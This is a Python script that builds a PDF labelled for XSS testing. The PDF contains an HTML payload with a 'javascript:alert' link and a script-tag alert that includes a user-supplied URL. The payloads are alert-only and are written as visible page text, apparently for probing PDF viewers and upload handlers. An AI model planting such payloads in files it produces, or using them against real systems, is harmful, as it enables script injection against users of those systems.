#!/usr/bin/env python3

import argparse
from fpdf import FPDF

# Set up command-line argument parsing
parser = argparse.ArgumentParser(description="Generate a PDF with XSS payload")
parser.add_argument('-f', '--file', type=str, default='file.pdf', help="Output PDF file path (default: file.pdf)")
parser.add_argument('-u', '--url', type=str, required=True, help="URL to inject in the <script> tag")

args = parser.parse_args()

# Create a simple PDF with HTML and JavaScript payload embedded
pdf = FPDF()

# Add a page to the PDF
pdf.add_page()

# Set the title
pdf.set_font('Arial', 'B', 16)
pdf.cell(200, 10, txt="XSS Test PDF with HTML and JavaScript Injection", ln=True, align='C')

# Set some description text
pdf.set_font('Arial', '', 12)
pdf.ln(10)  # Line break
pdf.cell(200, 10, txt="This PDF contains HTML and JavaScript payloads for XSS testing.", ln=True, align='C')

# HTML Payload for testing HTML Injection and Rendering
html_payload = """
<h1>This is a test header</h1>
<p><b>This should be rendered as bold text.</b></p>
<p>Testing <a href="javascript:alert('XSS Test')">Click me</a> for XSS execution.</p>
"""

# JavaScript Payload for testing execution (to be interpreted in PDF)
javascript_payload = f"""
<script>
    alert('plain JS XSS from URL: {args.url}')
</script>
"""

# Add HTML Payload for HTML Rendering Test
pdf.set_font('Arial', '', 8)
pdf.add_page()  # Add another page for the HTML content
pdf.multi_cell(0, 10, html_payload)

# Add JavaScript Payload (to test if any PDF readers execute JavaScript)
pdf.add_page()  # Another page for the JavaScript test
pdf.multi_cell(0, 10, javascript_payload)

# Save the PDF file to a location
output_file_path = args.file
pdf.output(output_file_path)

print(f"PDF created successfully: {output_file_path}")